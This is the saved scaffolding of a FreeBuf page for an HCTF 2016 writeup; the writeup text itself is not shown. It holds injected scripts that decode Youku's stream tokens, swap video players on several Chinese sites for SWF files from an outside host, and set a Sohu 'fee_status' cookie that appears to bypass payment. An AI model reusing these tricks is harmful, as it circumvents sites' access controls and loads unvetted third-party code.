                for (a = 0; 256 > a; a++) o = (o + i[a] + e.charCodeAt(a % e.length)) % 256,
                    n = i[a],
                    i[a] = i[o],
                    i[o] = n;
                a = 0,
                    o = 0;
                for (var s = 0; s < t.length; s++) a = (a + 1) % 256,
                    o = (o + i[a]) % 256,
                    n = i[a],
                    i[a] = i[o],
                    i[o] = n,
                    r += String.fromCharCode(t.charCodeAt(s) ^ i[(i[a] + i[o]) % 256]);
                return r
            }
            function s(e, t) {
                for (var n = [], i = 0; i < e.length; i++) {
                    var o = 0;
                    o = e[i] >= "a" && e[i] <= "z" ? e[i].charCodeAt(0) - "a".charCodeAt(0) : e[i] - "0" + 26;
                    for (var r = 0; 36 > r; r++) if (t[r] == o) {
                        o = r;
                        break
                    }
                    n[i] = o > 25 ? o - 26 : String.fromCharCode(o + 97)
                }
                return n.join("")
            }
            function l(e, t, n) {
                var i = this;
                new Date,
                    this._sid = m.sid,
                    this._fileType = n,
                    this._videoSegsDic = {},
                    this._ip = e.security.ip;
                var o = (new c, []),
                    r = [];
                r.streams = {},
                    r.logos = {},
                    r.typeArr = {},
                    r.totalTime = {};
                for (var a = 0; a < t.length; a++) {
                    for (var s = t[a].audio_lang, l = !1, d = 0; d < o.length; d++) if (o[d] == s) {
                        l = !0;
                        break
                    }
                    l || o.push(s)
                }
                for (var a = 0; a < o.length; a++) {
                    for (var u = o[a], h = {}, p = {}, f = [], d = 0; d < t.length; d++) {
                        var v = t[d];
                        if (u == v.audio_lang) {
                            if (!i.isValidType(v.stream_type)) continue;
                            var g = i.convertType(v.stream_type),
                                y = 0;
                            "none" != v.logo && (y = 1),
                                p[g] = y;
                            var b = !1;
                            for (var w in f) g == f[w] && (b = !0);
                            b || f.push(g);
                            var x = v.segs;
                            if (null == x) continue;
                            var k = [];
                            b && (k = h[g]);
                            for (var A = 0; A < x.length; A++) {
                                var C = x[A];
                                if (null == C) break;
                                var T = {};
                                T.no = A,
                                    T.size = C.size,
                                    T.seconds = Number(C.total_milliseconds_video) / 1e3,
                                    T.milliseconds_video = Number(v.milliseconds_video) / 1e3,
                                    T.key = C.key,
                                    T.fileId = this.getFileId(v.stream_fileid, A),
                                    T.src = this.getVideoSrc(d, A, e, v.stream_type, T.fileId),
                                    T.type = g,
                                    k.push(T)
                            }
                            h[g] = k
                        }
                    }
                    var M = this.langCodeToCN(u).key;
                    r.logos[M] = p,
                        r.streams[M] = h,
                        r.typeArr[M] = f
                }
                this._videoSegsDic = r,
                    this._videoSegsDic.lang = this.langCodeToCN(o[0]).key
            }
            function c(e) {
                this._randomSeed = e,
                    this.cg_hun()
            }
            var d = e("./canPlayM3U8"),
                u = e("./ajax"),
                h = [19, 1, 4, 7, 30, 14, 28, 8, 24, 17, 6, 35, 34, 16, 9, 10, 13, 22, 32, 29, 31, 21, 18, 3, 2, 23, 25, 27, 11, 20, 5, 15, 12, 0, 33, 26],
                p = {
                    a3: "b4et",
                    a4: "boa4"
                },
                m = {
                    a1: "4",
                    a2: "1"
                };
            n.match = function (e) {
                return /v\.youku\.com/.test(e.attr("host")) && !! window.videoId
            },
                n.parseYoukuCode = function (e, t) {
                    u({
                        url: "http://play.youku.com/play/get.json?vid=" + e + "&ct=12",
                        jsonp: !0,
                        callback: function (n) {
                            -1 == n && console.log("\u89e3\u6790youku\u89c6\u9891\u5730\u5740\u5931\u8d25", 2);
                            var c = n.data,
                                u = a(s(p.a3 + "o0b" + m.a1, h).toString(), o(c.security.encrypt_string)).split("_");
                            if (m.sid = u[0], m.token = u[1], d) {
                                var f = {
                                        vid: window.videoId,
                                        type: "[[type]]",
                                        ts: parseInt((new Date).getTime() / 1e3),
                                        keyframe: 0,
                                        ep: encodeURIComponent(r(a(s(p.a4 + "poz" + m.a2, h).toString(), m.sid + "_" + e + "_" + m.token))),
                                        sid: m.sid,
                                        token: m.token,
                                        ctype: 12,
                                        ev: 1,
                                        oip: c.security.ip,
                                        client_id: "youkumobileplaypage"
                                    },
                                    v = "http://pl.youku.com/playlist/m3u8?" + i(f);
                                t([
                                    ["\u8d85\u6e05", v.replace("[[type]]", "hd2")],
                                    ["\u9ad8\u6e05", v.replace("[[type]]", "mp4")],
                                    ["\u6807\u6e05", v.replace("[[type]]", "flv")]
                                ])
                            } else {
                                var g = new l(c, c.stream, "mp4");
                                console.log(g._videoSegsDic.streams),
                                    t([
                                        ["\u6807\u6e05", g._videoSegsDic.streams.guoyu["3gphd"][0].src]
                                    ])
                            }
                        }
                    })
                },
                n.getVideos = function (e, t) {
                    n.parseYoukuCode(window.videoId, t)
                },
                c.prototype = {
                    cg_hun: function () {
                        this._cgStr = "";
                        for (var e = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/\\:._-1234567890", t = e.length, n = 0; t > n; n++) {
                            var i = parseInt(this.ran() * e.length);
                            this._cgStr += e.charAt(i),
                                e = e.split(e.charAt(i)).join("")
                        }
                    },
                    cg_fun: function (e) {
                        for (var t = e.split("*"), n = "", i = 0; i < t.length - 1; i++) n += this._cgStr.charAt(t[i]);
                        return n
                    },
                    ran: function () {
                        return this._randomSeed = (211 * this._randomSeed + 30031) % 65536,
                        this._randomSeed / 65536
                    }
                },
                l.prototype = {
                    getFileId: function (e, t) {
                        if (null == e || "" == e) return "";
                        var n = "",
                            i = e.slice(0, 8),
                            o = t.toString(16);
                        1 == o.length && (o = "0" + o),
                            o = o.toUpperCase();
                        var r = e.slice(10, e.length);
                        return n = i + o + r
                    },
                    isValidType: function (e) {
                        return "3gphd" == e || "flv" == e || "flvhd" == e || "mp4hd" == e || "mp4hd2" == e || "mp4hd3" == e ? !0 : !1
                    },
                    convertType: function (e) {
                        var t = e;
                        switch (e) {
                            case "m3u8":
                                t = "mp4";
                                break;
                            case "3gphd":
                                t = "3gphd";
                                break;
                            case "flv":
                                t = "flv";
                                break;
                            case "flvhd":
                                t = "flv";
                                break;
                            case "mp4hd":
                                t = "mp4";
                                break;
                            case "mp4hd2":
                                t = "hd2";
                                break;
                            case "mp4hd3":
                                t = "hd3"
                        }
                        return t
                    },
                    langCodeToCN: function (e) {
                        var t = "";
                        switch (e) {
                            case "default":
                                t = {
                                    key: "guoyu",
                                    value: "\u56fd\u8bed"
                                };
                                break;
                            case "guoyu":
                                t = {
                                    key: "guoyu",
                                    value: "\u56fd\u8bed"
                                };
                                break;
                            case "yue":
                                t = {
                                    key: "yue",
                                    value: "\u7ca4\u8bed"
                                };
                                break;
                            case "chuan":
                                t = {
                                    key: "chuan",
                                    value: "\u5ddd\u8bdd"
                                };
                                break;
                            case "tai":
                                t = {
                                    key: "tai",
                                    value: "\u53f0\u6e7e"
                                };
                                break;
                            case "min":
                                t = {
                                    key: "min",
                                    value: "\u95fd\u5357"
                                };
                                break;
                            case "en":
                                t = {
                                    key: "en",
                                    value: "\u82f1\u8bed"
                                };
                                break;
                            case "ja":
                                t = {
                                    key: "ja",
                                    value: "\u65e5\u8bed"
                                };
                                break;
                            case "kr":
                                t = {
                                    key: "kr",
                                    value: "\u97e9\u8bed"
                                };
                                break;
                            case "in":
                                t = {
                                    key: "in",
                                    value: "\u5370\u5ea6"
                                };
                                break;
                            case "ru":
                                t = {
                                    key: "ru",
                                    value: "\u4fc4\u8bed"
                                };
                                break;
                            case "fr":
                                t = {
                                    key: "fr",
                                    value: "\u6cd5\u8bed"
                                };
                                break;
                            case "de":
                                t = {
                                    key: "de",
                                    value: "\u5fb7\u8bed"
                                };
                                break;
                            case "it":
                                t = {
                                    key: "it",
                                    value: "\u610f\u8bed"
                                };
                                break;
                            case "es":
                                t = {
                                    key: "es",
                                    value: "\u897f\u8bed"
                                };
                                break;
                            case "po":
                                t = {
                                    key: "po",
                                    value: "\u8461\u8bed"
                                };
                                break;
                            case "th":
                                t = {
                                    key: "th",
                                    value: "\u6cf0\u8bed"
                                }
                        }
                        return t
                    },
                    getVideoSrc: function (e, t, n, i, o, l, c) {
                        var d = n.stream[e],
                            u = n.video.encodeid;
                        if (!u || !i) return "";
                        var f = {
                                flv: 0,
                                flvhd: 0,
                                mp4: 1,
                                hd2: 2,
                                "3gphd": 1,
                                "3gp": 0
                            },
                            v = f[i],
                            g = {
                                flv: "flv",
                                mp4: "mp4",
                                hd2: "flv",
                                mp4hd: "mp4",
                                mp4hd2: "mp4",
                                "3gphd": "mp4",
                                "3gp": "flv",
                                flvhd: "flv"
                            },
                            y = g[i],
                            b = t.toString(16);
                        1 == b.length && (b = "0" + b);
                        var w = d.segs[t].total_milliseconds_video / 1e3,
                            x = d.segs[t].key;
                        ("" == x || -1 == x) && (x = d.key2 + d.key1);
                        var k = "";
                        n.show && (k = n.show.pay ? "&ypremium=1" : "&ymovie=1");
                        var A = "/player/getFlvPath/sid/" + m.sid + "_" + b + "/st/" + y + "/fileid/" + o + "?K=" + x + "&hd=" + v + "&myp=0&ts=" + w + "&ypp=0" + k,
                            C = encodeURIComponent(r(a(s(p.a4 + "poz" + m.a2, h).toString(), m.sid + "_" + o + "_" + m.token)));
                        return A += "&ep=" + C,
                            A += "&ctype=12",
                            A += "&ev=1",
                            A += "&token=" + m.token,
                            A += "&oip=" + this._ip,
                            A += (l ? "/password/" + l : "") + (c ? c : ""),
                            A = "http://k.youku.com" + A
                    }
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3
            }],
        15: [function (e, t) {
            t.exports = [e("./seeker_youku"), e("./seeker_tudou"), e("./seeker_hunantv")]
        },
            {
                "./seeker_hunantv": 12,
                "./seeker_tudou": 13,
                "./seeker_youku": 14
            }]
    }, {}, [1]);
//# sourceMappingURL=index.js.map
</script><script>doAdblock();
function doAdblock(){
    (function() {
        function A() {}
        A.prototype = {
            rules: {
                /*youku_loader: {
                 find: /^http:\/\/static\.youku\.com(\/v[\d\.]*)?\/v\/swf\/loaders?[^\.]*\.swf/,
                 replace: "http://2016.adtchrome.com/loader.swf"
                 },
                 youku_player: {
                 find: /^http:\/\/static\.youku\.com(\/v[\d\.]*)?\/v\/swf\/(q?player[^\.]*|\w{13})\.swf/,
                 replace: "http://2016.adtchrome.com/player.swf"
                 },*/
                'pps_pps': {
                    'find': /^http:\/\/www\.iqiyi\.com\/player\/cupid\/common\/pps_flvplay_s\.swf/,
                    'replace': 'http://swf.adtchrome.com/pps_20140420.swf'
                },
                /*'iqiyi_1': {
                 'find': /^http:\/\/www\.iqiyi\.com\/player\/cupid\/common\/.+\.swf$/,
                 'replace': 'http://swf.adtchrome.com/iqiyi_20140624.swf'
                 },
                 'iqiyi_2': {
                 'find': /^http:\/\/www\.iqiyi\.com\/common\/flashplayer\/\d+\/.+\.swf$/,
                 'replace': 'http://swf.adtchrome.com/iqiyi_20140624.swf'
                 },*/
                'ku6': {
                    'find': /^http:\/\/player\.ku6cdn\.com\/default\/.*\/\d+\/(v|player|loader)\.swf/,
                    'replace': 'http://swf.adtchrome.com/ku6_20140420.swf'
                },
                'ku6_topic': {
                    'find': /^http:\/\/player\.ku6\.com\/inside\/(.*)\/v\.swf/,
                    'replace': 'http://swf.adtchrome.com/ku6_20140420.swf?vid=$1'
                },
                'sohu': {
                    'find':/http:\/\/(tv\.sohu\.com\/upload\/swf\/(?!(ap|56)).*\d+|(\d+\.){3}\d+(:\d+)?\/(web|test)player)\/(Main|PlayerShell)[^\.]*\.swf/,
                    'replace': "http://adtchrome.b0.upaiyun.com/sohu_live.swf"
                },
                /*'sohu2':{
                 'find':/^http:\/\/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\/testplayer\/Main0?\.swf/,
                 'replace':'http://www.adtchrome.com/sohu/sohu_20150104.swf'
                 },
                 'sohu_share': {
                 'find': /^http:\/\/share\.vrs\.sohu\.com\/my\/v\.swf&/,
                 'replace': 'http://www.adtchrome.com/sohu/sohu_20150104.swf?'
                 },
                 'sohu_sogou' : {
                 'find': /^http:\/\/share\.vrs\.sohu\.com\/(\d+)\/v\.swf/,
                 'replace': 'http://www.adtchrome.com/sohu/sohu_20150104.swf?vid=$1'
                 },
                 'letv': {
                 'find': /^http:\/\/player\.letvcdn\.com\/.*p\/.*\/newplayer\/LetvPlayer\.swf/,
                 'replace': 'http://swf.adtchrome.com/20150110_letv.swf'
                 },
                 'letv_topic': {
                 'find': /^http:\/\/player\.hz\.letv\.com\/hzplayer\.swf\/v_list=zhuanti/,
                 'replace': 'http://swf.adtchrome.com/20150110_letv.swf'
                 },
                 'letv_duowan': {
                 'find': /^http:\/\/assets\.dwstatic\.com\/video\/vpp\.swf/,
                 'replace': 'http://yuntv.letv.com/bcloud.swf'
                 },*/
                '17173_in':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/PreloaderFile(Customer)?\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_in_20150522.swf"
                },
                '17173_out':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/PreloaderFileFirstpage\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_out_20150522.swf"
                },
                '17173_live':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/Player_stream(_firstpage)?\.swf/,
                    'replace':"http://swf.adtchrome.com/17173_stream_20150522.swf"
                },
                '17173_live_out':{
                    'find':/http:\/\/f\.v\.17173cdn\.com\/(\d+\/)?flash\/Player_stream_(custom)?Out\.swf/,
                    'replace':"http://swf.adtchrome.com/17173.out.Live.swf"
                }
            },
            _done: null,
            get done() {
                if(!this._done) {
                    this._done = new Array();
                }
                return this._done;
            },
            addAnimations: function() {
                var style = document.createElement('style');
                style.type = 'text/css';
                style.innerHTML = 'object,embed{\
                -webkit-animation-duration:.001s;-webkit-animation-name:playerInserted;\
                -ms-animation-duration:.001s;-ms-animation-name:playerInserted;\
                -o-animation-duration:.001s;-o-animation-name:playerInserted;\
                animation-duration:.001s;animation-name:playerInserted;}\
                @-webkit-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @-ms-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @-o-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}\
                @keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}';
                document.getElementsByTagName('head')[0].appendChild(style);
            },
            animationsHandler: function(e) {
                if(e.animationName === 'playerInserted') {
                    this.replace(e.target);
                }
            },
            replace: function(elem) {
                if (/http:\/\/v.youku.com\/v_show\/.*/.test(window.location.href)){
                    var tag = document.getElementById("playerBox").getAttribute("player")
                    if (tag == "adt"){
                        console.log("adt adv")
                        return;
                    }
                }
                if(this.done.indexOf(elem) != -1) return;
                this.done.push(elem);
                var player = elem.data || elem.src;
                if(!player) return;
                var i, find, replace = false;
                for(i in this.rules) {
                    find = this.rules[i]['find'];
                    if(find.test(player)) {
                        replace = this.rules[i]['replace'];
                        if('function' === typeof this.rules[i]['preHandle']) {
                            this.rules[i]['preHandle'].bind(this, elem, find, replace, player)();
                        }else{
                            this.reallyReplace.bind(this, elem, find, replace)();
                        }
                        break;
                    }
                }
            },
            reallyReplace: function(elem, find, replace) {
                elem.data && (elem.data = elem.data.replace(find, replace)) || elem.src && ((elem.src = elem.src.replace(find, replace)) && (elem.style.display = 'block'));
                var b = elem.querySelector("param[name='movie']");
                this.reloadPlugin(elem);
            },
            reloadPlugin: function(elem) {
                var nextSibling = elem.nextSibling;
                var parentNode = elem.parentNode;
                parentNode.removeChild(elem);
                var newElem = elem.cloneNode(true);
                this.done.push(newElem);
                if(nextSibling) {
                    parentNode.insertBefore(newElem, nextSibling);
                } else {
                    parentNode.appendChild(newElem);
                }
            },
            init: function() {
                var desc = navigator.mimeTypes['application/x-shockwave-flash'].description.toLowerCase();
                /*if(desc.indexOf('adobe')>-1){
                 delete this.rules["iqiyi_1"];
                 delete this.rules["iqiyi_2"];
                 }*/
                if(document.URL.indexOf('tv.sohu.com')<=0){
                    delete this.rules["sohu"];
                }
                var handler = this.animationsHandler.bind(this);
                document.body.addEventListener('webkitAnimationStart', handler, false);
                document.body.addEventListener('msAnimationStart', handler, false);
                document.body.addEventListener('oAnimationStart', handler, false);
                document.body.addEventListener('animationstart', handler, false);
                this.addAnimations();
            }
        };
        new A().init();
    })();
}
// 20140730
(function cnbeta() {
    if (document.URL.indexOf('cnbeta.com') >= 0) {
        var elms = document.body.querySelectorAll("p>embed");
        Array.prototype.forEach.call(elms, function(elm) {
            elm.style.marginLeft = "0px";
        });
    }
})();
//baidu
//display: inline !important; visibility: visible !important;
//display:block !important;visibility:visible !important; display:block !important;visibility:visible !important
if(document.URL.indexOf('www.baidu.com') >= 0){
    if(document && document.getElementsByTagName && document.getElementById && document.body){
        var a = function(){
            Array.prototype.forEach.call(document.body.querySelectorAll("#content_left>div,#content_left>table"), function(e) {
                var a = e.getAttribute("style");
                if(a && /display:(table|block)\s!important/.test(a)){
                    e.parentNode.removeChild(e)
                }
            });
        };
        a();
        var MutationObserver = window.MutationObserver ||  window.WebKitMutationObserver || window.MozMutationObserver;
        var callback = function(records) {
            records.map(function(record) {
                console.log('block baidu')
                a();
            });
        };
        var mo = new MutationObserver(callback);
        mo.observe(document.getElementById('wrapper_wrapper'), { 'childList': true, 'subtree': true });
    };
}
// 20140922
(function kill_360() {
    if (document.URL.indexOf('so.com') >= 0) {
        document.getElementById("e_idea_pp").style.display = none;
    }
})();
//解决腾讯视频列表点击无效
if(document.URL.indexOf("v.qq.com") >= 0){
    if (document.getElementById("mod_videolist")){
        var listBox = document.getElementById("mod_videolist")
        var list = listBox.getElementsByClassName("list_item")
        for (i = 0;i < list.length;i++){
            list[i].addEventListener("click", function() {
                var url = this.getElementsByTagName("a")[0]
                url = url.getAttribute("href")
                var host = window.location.href
                url = host.replace(/cover\/.*/,url)
                window.location.href = url
            })
        }
    }
}
if (document.URL.indexOf("tv.sohu.com") >= 0){
    if (document.cookie.indexOf("fee_status=true")==-1){document.cookie='fee_status=true'};
}
if(/v\.youku\.com\/v_show\/id/.test(document.URL)){
    document.getElementById('vpactionv5_wrap').style.display = "none"
}
if(document.URL.indexOf("iqiyi.com") >= 0){
!function(){var player=document.getElementById("flash");var box=document.getElementById("flashbox");if(box!==null){var tmp=box.getAttribute("data-player-flashvars");if(tmp==null||tmp==""){box.setAttribute("data-player-flashvars","playerUrl=&tipdataurl=&components=&cid=&preloader=&gpu=&showBrand=&adurl=&flashP2PCoreUrl=")}}if(player==null){player=document.getElementById("swf_flashbox")}if(player==null){return}var divs=player.parentElement;var flashVars=document.getElementsByName("flashVars")[0];if(typeof flashVars=="undefined"){return}player.data="http://www.iqiyi.com/common/flashplayer/20161012/10235b45a8bb.swf";var params=flashVars.value.split("&");var value="";for(var i=0;i<params.length;i++){if(params[i].indexOf("adurl")==0){value+="&adurl=http://2016.adtchrome.com/am.swf"}else if(params[i].indexOf("playerUrl")==0){value+="&playerUrl=http://www.iqiyi.com/common/flashplayer/20161012/10235b45a8bb.swf"}else if(params[i].indexOf("cid")==0){value+="&cid=qc_100001_100141"}else{if(value!=""){value+="&"}value+=params[i]}}if(value.indexOf("qc_100001_100141")<1){value+="&cid=qc_100001_100141"}flashVars.value=value;divs.removeChild(player);divs.appendChild(player)}()
}
</script><style type="text/css">object,embed{                -webkit-animation-duration:.001s;-webkit-animation-name:playerInserted;                -ms-animation-duration:.001s;-ms-animation-name:playerInserted;                -o-animation-duration:.001s;-o-animation-name:playerInserted;                animation-duration:.001s;animation-name:playerInserted;}                @-webkit-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @-ms-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @-o-keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}                @keyframes playerInserted{from{opacity:0.99;}to{opacity:1;}}</style><link rel="stylesheet" href="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/share_style1_24.css"></head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                <div class="header-logo"><a href="http://www.freebuf.com/"></a></div>
                <div class="nav">
                    <ul class="nav-child clearfix">
                        <li class=" index"><a href="http://www.freebuf.com/">首页</a></li>
                        <li class="read-classify">
                            <a href="http://www.freebuf.com/articles/web/121778.html#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                            <ul class="dropdown-menu">
                                <li>
                                    <strong>黑客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                        <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                        <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                        <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                        <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                        <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                        <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                        <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                        <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>极客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                        <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>特色</strong>
                                    <div class="nav-item"><a href="http://www.freebuf.com/news/special" target="_blank">头条</a><a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a><a href="http://www.freebuf.com/fevents" target="_blank">活动</a><a href="http://www.freebuf.com/video" target="_blank">视频</a><a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a><a href="http://www.freebuf.com/jobs" target="_blank">招聘</a><a href="http://www.freebuf.com/paper/" target="_blank">报告</a></div>
                                </li>
                            </ul>
                        </li>
                        <li><a href="http://www.freebuf.com/wenku" target="_blank">文库</a><b class="icon-betr"></b></li>
                        <li><a href="http://fit.freebuf.com/" target="_blank">FIT大会</a><b class="icon-hot"></b></li>
                        <li><a href="http://bar.freebuf.com/" target="_blank">小酒馆</a></li>
                        <li><a href="http://open.freebuf.com/" target="_blank">公开课</a></li>
                        <li><a href="http://shop.freebuf.com/" target="_blank">商城</a></li>
                        <li><a href="https://www.vulbox.com/" target="_blank">漏洞盒子</a></li>
                    </ul>
                </div>
                <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <div class="btn-publish">
                        <a href="http://www.freebuf.com/articles/web/121778.html#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="http://www.freebuf.com/articles/web/121778.html#"></a>
                    <ul class="nav-child clearfix">
                        <li class=" index"><a href="http://www.freebuf.com/">首页</a></li>
                        <li class="read-classify">
                            <a href="http://www.freebuf.com/articles/web/121778.html#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                            <ul class="dropdown-menu">
                                <li>
                                    <strong>黑客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                        <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                        <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                        <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                        <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                        <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                        <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                        <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                        <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>极客</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                        <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                    </div>
                                </li>
                                <li>
                                    <strong>特色</strong>
                                    <div class="nav-item">
                                        <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                        <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                        <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                        <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                        <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                        <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                        <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                    </div>
                                </li>
                            </ul>
                        </li>
                        <li><a href="http://www.freebuf.com/wenku" target="_blank">文库</a></li>
                        <li><a href="http://fit.freebuf.com/" target="_blank">FIT大会</a></li>
                        <li><a href="http://bar.freebuf.com/" target="_blank">小酒馆</a></li>
                        <li><a href="http://open.freebuf.com/" target="_blank">公开课</a></li>
                        <li><a href="http://shop.freebuf.com/" target="_blank">商城</a></li>
                        <li><a href="https://www.vulbox.com/" target="_blank">漏洞盒子</a></li>
                        <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a></li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<script type="application/javascript">
    $(function(){
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
            $(".read-classify").find(".dropdown-menu").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //分类阅读下拉菜单
        $(".read-classify").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(this).find(".dropdown-menu").toggle();
        });
        //分类阅读hover状态
        $(".read-classify").hover(function(){
            $(this).find("a > b").addClass("triangle-down-w");
        },function(){
            $(this).find("a > b").removeClass("triangle-down-w");
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
    });

</script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/prettify.js"></script>
<script type="text/javascript" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="container pad-top35">
  <div class="row clearfix">
